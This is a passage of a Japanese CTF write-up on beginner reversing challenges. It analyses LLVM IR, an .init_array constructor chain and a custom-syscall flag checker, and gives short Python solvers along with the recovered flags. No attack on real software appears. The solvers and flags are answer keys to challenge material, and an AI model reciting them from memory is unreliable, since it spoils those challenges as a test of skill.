  br label %15, <span class="token operator">!</span>llvm.loop <span class="token operator">!</span><span class="token number">6</span>

<span class="token number">41</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %15
  %42 <span class="token operator">=</span> load i32, i32* %4, align <span class="token number">4</span>
  %43 <span class="token operator">=</span> icmp eq i32 %42, <span class="token number">49</span>
  br i1 %43, label %44, label %47

<span class="token number">44</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %41
  %45 <span class="token operator">=</span> getelementptr inbounds <span class="token punctuation">[</span><span class="token number">70</span> x i8<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">70</span> x i8<span class="token punctuation">]</span>* %2, i64 <span class="token number">0</span>, i64 <span class="token number">0</span>
  %46 <span class="token operator">=</span> call i32 <span class="token punctuation">(</span>i8*, <span class="token punctuation">..</span>.<span class="token punctuation">)</span> @printf<span class="token punctuation">(</span>i8* noundef getelementptr inbounds <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">22</span> x i8<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">22</span> x i8<span class="token punctuation">]</span>* @.str.2, i64 <span class="token number">0</span>, i64 <span class="token number">0</span><span class="token punctuation">)</span>, i8* noundef %45<span class="token punctuation">)</span>
  store i32 <span class="token number">0</span>, i32* %1, align <span class="token number">4</span>
  br label %50

<span class="token number">47</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %41
  br label %48

<span class="token number">48</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %47, %0
  %49 <span class="token operator">=</span> call i32 @puts<span class="token punctuation">(</span>i8* noundef getelementptr inbounds <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">16</span> x i8<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">16</span> x i8<span class="token punctuation">]</span>* @.str.3, i64 <span class="token number">0</span>, i64 <span class="token number">0</span><span class="token punctuation">))</span>
  store i32 <span class="token number">1</span>, i32* %1, align <span class="token number">4</span>
  br label %50

<span class="token number">50</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %48, %44
  %51 <span class="token operator">=</span> load i32, i32* %1, align <span class="token number">4</span>
  ret i32 %51
<span class="token punctuation">}</span></code></pre></div>
<p>そのため、以下の Solver を使用して Key を次の Key の値と XOR する操作を繰り返し行うことで簡単に Flag を特定できました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
    
<span class="token comment"># ctf4b{7ick_7ack_11vm_int3rmed14te_repr3sen7a7i0n}</span></code></pre></div>
<h2 id="constructrev" style="position:relative;"><a href="#constructrev" aria-label="constructrev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>construct(Rev)</h2>
<blockquote>
<p>使っていない関数がたくさんある……？</p>
</blockquote>
<p>問題バイナリを解析すると、main 関数では特に着目すべき操作は実施していないものの、<code class="language-text">.init_array</code> に関数チェーンが登録されていることがわかります。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 449px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/9394035879318735fa9c024967b03c24/053a9/image-20240615161025077.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 102.50000000000001%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAVCAYAAABG1c6oAAAACXBIWXMAAAsTAAALEwEAmpwYAAACyUlEQVQ4y42V627iMBCFeQISICQUCkkc23GutECllbpdCqiUSm1X/dG9vf97nB07gQISpT8siMCfz5w54zQEl1AyRqyXEFBKocgLxDE9qwRlWZjfI8GRXudQRQKZxUgnOeJMwe124XoeXNc1q/H6+w0v76/YvDxhtVphvV5juVhgsX7Ew/ML5o+PmD9tsNisMF/f437xA4vlEvP7Oe7u7nB7e3uwGsmsgBwrDNkIjuvBsm20HQddz4XdaiFhHLMkw4TWlNZYKtiWhWazCatpwbIOVyOdlVCTFEHM0Om00e50wYsU8iqjUnp4+L7En81P/Hp+x7+3v3jbvKJFB+nNNh1+vBrJNEd2UyDKBNrtlgEy8oalEl7vAu6IwRmF6PEEw3wCj8lq82lggWSaIZDhTqEGinFqFF4SYBjFGIoErJiB5ddm42mFswo4inwCdg6AWuGAgJdcYaQK8OtvGMqEYJ8BSWFKZYeq9tCpgSUp7PXQD7mBjuIcQXpFn9kZhRo4yxDGh0BZlzwIBfpBZIBhMcFIpruOnmyKAW4VdhwDjHJVAXXJ5KGfjo2H2ssK9omHBwq1hwSLKTbeRd8ATckyg5+UVHZp8nlSYWqA2sNoB4xIIacR25ZcQWPTlCAbf8XDHCwhYPsDaIJtulwBw2KKqLzZK9n+god7QL7nofGRQLrLPsXnDLAwk8ISXgGdWuE4M7HRJV/WwdadrmJjnS/ZeLin0ORw2+U62CFNiW6MbbfOT4ovgo8cpvEuNjrYegU6NuXMwM80Ja9mOa5n2XFJraBnUY1eHewqMuRhUhzE5hi885BvbxujUMKX0W6WfVXuJsUbDAnSPADtfz+YZYeucO2P43bR6Tp0gPa0A8e7MJev2x+Yu1Bv3N6J1nHJLIwgIo6IRWBBCMYYBL1bAt+H4PSOoXeLRwdEitOtPkQg6D8ph8ikaeJxyf8BFgk46VQXJH8AAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/9394035879318735fa9c024967b03c24/8ac56/image-20240615161025077.webp 240w,
/static/9394035879318735fa9c024967b03c24/57bab/image-20240615161025077.webp 449w"
              sizes="(max-width: 449px) 100vw, 449px"
              type="image/webp"
            />
          <source
            srcset="/static/9394035879318735fa9c024967b03c24/8ff5a/image-20240615161025077.png 240w,
/static/9394035879318735fa9c024967b03c24/053a9/image-20240615161025077.png 449w"
            sizes="(max-width: 449px) 100vw, 449px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/9394035879318735fa9c024967b03c24/053a9/image-20240615161025077.png"
            alt="image-20240615161025077"
            title="image-20240615161025077"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>これは、プログラム実行時の初期化などに使用される関数ポインタの配列が格納されるもので、main 関数の前に実行されます。</p>
<p>そのため、ここでチェーンされている関数を上から順番に調べていくことにします。</p>
<h3 id="コマンドライン引数の有無をチェック" style="position:relative;"><a href="#%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%83%A9%E3%82%A4%E3%83%B3%E5%BC%95%E6%95%B0%E3%81%AE%E6%9C%89%E7%84%A1%E3%82%92%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF" aria-label="コマンドライン引数の有無をチェック permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>コマンドライン引数の有無をチェック</h3>
<p>まず始めの関数では、コマンドライン引数の有無を検証しているようです。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/73ab23e74d67f17676b58de084f42253/c6671/image-20240615161121587.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 37.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABVklEQVQoz22RW1ODQAyF+TfQcl1A7cUHoa21BYQulwWqbR0dn/z/r8fsKrUz9uGbk2RDkjlo4/EYA6PRSKlpmueais2/mtQhHvov0S4fdF3HZDZB23foD3v0pz1E36LtWgiio3rTNBCtQBAGMHTj+sABwzBwN52gqmscPo44fb1DvNAwIWhYj4aUlyU45/CDQPX/GyivG5ANwW2I1foRm2yLhKd4yjZYrpaIFrHiIY4QxTFcz1X9l99LNNu2YVkWPJ+pJseVOJB1m+qSG4/Bd1wwInQ9uPRmkq8WeWn9ejqolhc5dhVH1dWQcU1xkmyxXiywo7xpa1SiQr17RssLiLJGmReUc6VVwdHwEhXl97M5NJcu8pinkBf6jKnrllGEsi7x+nmEeOvJtxw9DRddpzzMsowWJ0jTVCHz+XQKTfpwDUaLAt8/47MfQopD+iFy8SUB4dAh3+CQDPaKGLUAAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/73ab23e74d67f17676b58de084f42253/8ac56/image-20240615161121587.webp 240w,
/static/73ab23e74d67f17676b58de084f42253/d3be9/image-20240615161121587.webp 480w,
/static/73ab23e74d67f17676b58de084f42253/e46b2/image-20240615161121587.webp 960w,
/static/73ab23e74d67f17676b58de084f42253/ea1d1/image-20240615161121587.webp 1129w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/73ab23e74d67f17676b58de084f42253/8ff5a/image-20240615161121587.png 240w,
/static/73ab23e74d67f17676b58de084f42253/e85cb/image-20240615161121587.png 480w,
/static/73ab23e74d67f17676b58de084f42253/d9199/image-20240615161121587.png 960w,
/static/73ab23e74d67f17676b58de084f42253/c6671/image-20240615161121587.png 1129w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/73ab23e74d67f17676b58de084f42253/d9199/image-20240615161121587.png"
            alt="image-20240615161121587"
            title="image-20240615161121587"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="文字数が-0x20-文字かどうかを検証" style="position:relative;"><a href="#%E6%96%87%E5%AD%97%E6%95%B0%E3%81%8C-0x20-%E6%96%87%E5%AD%97%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B%E3%82%92%E6%A4%9C%E8%A8%BC" aria-label="文字数が 0x20 文字かどうかを検証 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>文字数が 0x20 文字かどうかを検証</h3>
<p>次の関数では、受け取ったコマンドライン引数の文字数が 0x20 かどうかを検証しています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 718px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/6191c69fac5d5b621a661be85f3824f5/57dc1/image-20240615161131582.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 37.083333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABTUlEQVQoz22QW2+CQBCF/TOVS7hLraVRC4hoFJalIAiatjF98v8/n86ukrZJHz5mZlnOHM5IURTMnmfgbxy8LlEQjBcoCMYZWMGov8GK/A77Q8Yy2I4NVVUxEoLBS4C2bXG5fuH9ekF3OuLz44y+79Cde5xoPja1pG8rWbumQtM2ODQHVHUFx3VugqqiYvo0RbrdYFdk2PE9kk2KJF0TiWS9TRGtYoQDcSzngTiJYZFDTQhqmgZd12FaFizThGmY8CYevMcJXM+V+P4EE3Lg2bbEd12Y4q5pyG8Mw4Cmk46m3wWpieLollfFkZdUKReWZ8jpLA5D5Pu9/L3m1KCmvA8ic16iZAzzIICIThj7cUibbNousGzrV2/DdRws5nNEUYh4HeF1uUC0XNKiCCvC9zyZnxQUDyEqEIf/Id+RA2U8hvIwlm6UYaY6iIl732Ti79heQqZkAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/6191c69fac5d5b621a661be85f3824f5/8ac56/image-20240615161131582.webp 240w,
/static/6191c69fac5d5b621a661be85f3824f5/d3be9/image-20240615161131582.webp 480w,
/static/6191c69fac5d5b621a661be85f3824f5/7d0c9/image-20240615161131582.webp 718w"
              sizes="(max-width: 718px) 100vw, 718px"
              type="image/webp"
            />
          <source
            srcset="/static/6191c69fac5d5b621a661be85f3824f5/8ff5a/image-20240615161131582.png 240w,
/static/6191c69fac5d5b621a661be85f3824f5/e85cb/image-20240615161131582.png 480w,
/static/6191c69fac5d5b621a661be85f3824f5/57dc1/image-20240615161131582.png 718w"
            sizes="(max-width: 718px) 100vw, 718px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/6191c69fac5d5b621a661be85f3824f5/57dc1/image-20240615161131582.png"
            alt="image-20240615161131582"
            title="image-20240615161131582"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="入力文字を先頭から-2-文字ずつ検証" style="position:relative;"><a href="#%E5%85%A5%E5%8A%9B%E6%96%87%E5%AD%97%E3%82%92%E5%85%88%E9%A0%AD%E3%81%8B%E3%82%89-2-%E6%96%87%E5%AD%97%E3%81%9A%E3%81%A4%E6%A4%9C%E8%A8%BC" aria-label="入力文字を先頭から 2 文字ずつ検証 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>入力文字を先頭から 2 文字ずつ検証</h3>
<p>これ以降の関数では、ハードコードされたバイト列の中から 2 文字を取り出して、入力文字列の 2 文字と一致するかを検証する処理が行われます。</p>
<p>このとき検証されている値をバイナリから抜き出して以下の Solver を作成しました。</p>
<p>これを実行することで正しい Flag が <code class="language-text">ctf4b{c0ns7ruc70rs_3as3_h1d1ng_7h1ngs!}</code> であることを特定できました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">""</span>
f <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"c0_d4yk261hbosje893w5igzfrvaumqlptx7n"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"oxnske1cgaiylz0mwfv7p9r32h6qj8bt4d_u5"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"lzau7rvb9qh5_1ops6jg3ykf8x0emtcind24w"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"9_xva4uchnkyi6wb2ld507p8g3stfej1rzqmo"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"r8x9wn65701zvbdfp4ioqc2hy_juegkmatls3"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"tufij3cykhrsl841qo6_0dwg529zanmbpvxe7"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"b0i21csjhqug_3erat9f6mx854pyol7zkvdwn"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"17zv5h6wjgbqerastioc294n0lxu38fdk_ypm"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"1cgovr4tzpnj29ay3_8wk7li6uqfmhe50bdsx"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"3icj_go9qd0svxubefh14ktywpzma2l7nr685"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"c7l9532k0avfxso4uzipd18egbnyw6rm_tqjh"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"l8s0xb4i1frkv6a92j5eycng3mwpzduqth_7o"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"l539rbmoifye0u6dj1pw8nqt_74sz2gkvaxch"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"aj_d29wcrqiok53b7tyn0p6zvfh1lxgum48es"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"3mq16t9yfs842cbvlw5j7k0prohengduzx_ai"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"_k6nj8hyxvzcgr1bu2petf5qwl09ids!om347a"</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">+=</span> f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># c0ns7ruc70rs_3as3_h1d1ng_7h1ngs!</span></code></pre></div>
<h2 id="former-seccomprev" style="position:relative;"><a href="#former-seccomprev" aria-label="former seccomprev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>former-seccomp(Rev)</h2>
<blockquote>
<p>フラグチェック用のシステムコールを自作してみました</p>
</blockquote>
<p>問題バイナリを解析すると、始めに fork 関数を実行し、子プロセスが自身のコピーを子プロセスとして作成していることがわかります。</p>
<p>子プロセス側では、以下の check 関数が呼び出され、入力値として受け取った Flag 文字列を引数としてシステムコール 0xcafe を実行することで、Flag が正しいかどうかの検証を行っているようです。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 629px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/3eb971a0821c2c0558f0206edf806ba5/63a68/image-20240615171603286.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 117.08333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAYAAAALHW+jAAAACXBIWXMAAAsTAAALEwEAmpwYAAACuklEQVQ4y5VVWXbaQBDkNEbrLJqRxGZiHIOA4Czv5SUnyP2PUKluAQYZ288fhaSRpqe7qroZ7XdbHJ4P2H7/hW63x+HbHj9/HLDbdliv19fYrF+vDTAqjUFRFCjLEsZavWZZhlSQZi/3+pzq8wl5nr/CSF5IoLqu0U5aNG2jQUPl0AYL5z2Ct4rY1LD81gWne9Ik1UMuoQE9P27qgEl0WMwazKYNlosWj1+mqGJA3QQ0RJTDWFFpWRUPHWYsGJ1SdSZHjBUz8LxnNlWEcx5ZXiBJEiJFMk6ussmONFwG1oBZxmDMcrlcsGxmVQUYBpX19GKTIknPpd4MmDGgNSUzM3CEdz2cKVBZClUWKPjeEMKtJbeCgus3Sz4FDBV5pAh18ArJWESxwhkPsAoLw3XDg/OieJtDKa32BvNpDU/urHUsNcc4Sa7KFC5TxQccFoRhOWKdGCM59OrN4elD3C6ZP4HZNfRWXTdoibyguTWz5Oam99D70Em5Dab3CzWvIVfitdJXGry3TY/0eFByhYGxpSsWswkeHpeYz1qW7WjkiDidUAiqSgsFWilUFakx2iUikHaNd+qQksKKwMqhqCycibkrR8WZceCHnlxKZ/QBKw0q9+dArm/NU0BR/qzyJNLY9zP28hQxRFonIhBq7nRQ8lD5YS8LSkYXhUMINLjVl3d3dy9tN+AtHQQ6B1ytVug2T+i6NbbrFX4/7/Hv7x/InNzud9hwfbd5xH7fcV5u0W03nHtP+EqsHlaQ/ZcYCR+exEt3zCY1Hu6XFGjGweBeeNKWdP3aUQwRxpDfIUaSpvSrs+Vx0BrlTbpkPB6/KvUjnG0jUC7LfggIp3JiL9onjK3zUKZ2maFi49exwaRpVWW5im0+0y2aYeSkmc+nCOzl838KgyTvDNK3M2Rpwp2KQ5MK8ZL15ebPZPgfW4zIbg4tyNkAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/3eb971a0821c2c0558f0206edf806ba5/8ac56/image-20240615171603286.webp 240w,
/static/3eb971a0821c2c0558f0206edf806ba5/d3be9/image-20240615171603286.webp 480w,
/static/3eb971a0821c2c0558f0206edf806ba5/abae2/image-20240615171603286.webp 629w"
              sizes="(max-width: 629px) 100vw, 629px"
              type="image/webp"
            />
          <source
            srcset="/static/3eb971a0821c2c0558f0206edf806ba5/8ff5a/image-20240615171603286.png 240w,
/static/3eb971a0821c2c0558f0206edf806ba5/e85cb/image-20240615171603286.png 480w,
/static/3eb971a0821c2c0558f0206edf806ba5/63a68/image-20240615171603286.png 629w"
            sizes="(max-width: 629px) 100vw, 629px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/3eb971a0821c2c0558f0206edf806ba5/63a68/image-20240615171603286.png"
            alt="image-20240615171603286"
            title="image-20240615171603286"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>一方で、親プロセス側では子プロセスの PID を引数として何らかの関数が呼び出されています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 444px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/d4dd2736a58258f75906e4d417a3011d/9b7bd/image-20240615171546469.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
